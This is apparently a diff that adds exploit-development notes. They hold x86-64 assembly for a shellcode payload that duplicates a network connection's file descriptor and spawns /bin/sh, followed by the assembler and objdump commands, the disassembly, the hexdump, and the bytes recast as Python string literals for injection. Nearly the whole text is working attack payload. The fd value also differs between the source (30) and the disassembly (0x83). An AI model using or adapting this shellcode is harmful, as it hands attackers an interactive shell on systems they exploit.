@@ -1,0 +1,49 @@
+test.asm:
+do_dup2:
+xor esi,esi
+mov edi, 30 ; TODO fd of conn #2 must be set here
+mov eax, 33 ; syscall number of dup2
+syscall
+call do_execve
+db "/bin/sh",0
+do_execve:
+xor edx,edx
+xor esi,esi
+pop rdi
+mov eax, 59 ; syscall number of execve
+syscall
+
+cmd:
+$ nasm -f elf64 test.asm && objdump -d test.o
+$ hexdump -C test.o # can see /bin/sh on line 0x180
+
+from objdump:
+0000000000000000 <do_dup2>:
+   0: 31 f6                 xor    %esi,%esi
+   2: bf 83 00 00 00        mov    $0x83,%edi
+   7: b8 21 00 00 00        mov    $0x21,%eax
+   c: 0f 05                 syscall 
+   e: e8 08 00 00 00        callq  1b <do_execve>
+  13: 2f                    (bad)  
+  14: 62                    (bad)  
+  15: 69 6e 2f 73 68 00 31  imul   $0x31006873,0x2f(%rsi),%ebp
+
+000000000000001b <do_execve>:
+  1b: 31 d2                 xor    %edx,%edx
+  1d: 31 f6                 xor    %esi,%esi
+  1f: 5f                    pop    %rdi
+  20: b8 3b 00 00 00        mov    $0x3b,%eax
+  25: 0f 05                 syscall 
+
+from hexdump line 0x180:
+31 f6 bf 83 00 00 00 b8  21 00 00 00 0f 05 e8 08
+00 00 00 2f 62 69 6e 2f  73 68 00 31 d2 31 f6 5f 
+b8 3b 00 00 00 0f 05 
+
+
+convert hexdump to 8 byte strings in python:
+'\x31\xf6\xbf\x83\x00\x00\x00\xb8' '\x21\x00\x00\x00\x0f\x05\xe8\x08'
+'\x00\x00\x00\x2f\x62\x69\x6e\x2f' '\x73\x68\x00\x31\xd2\x31\xf6\x5f'
+'\xb8\x3b\x00\x00\x00\x0f\x05\x00'
+
+
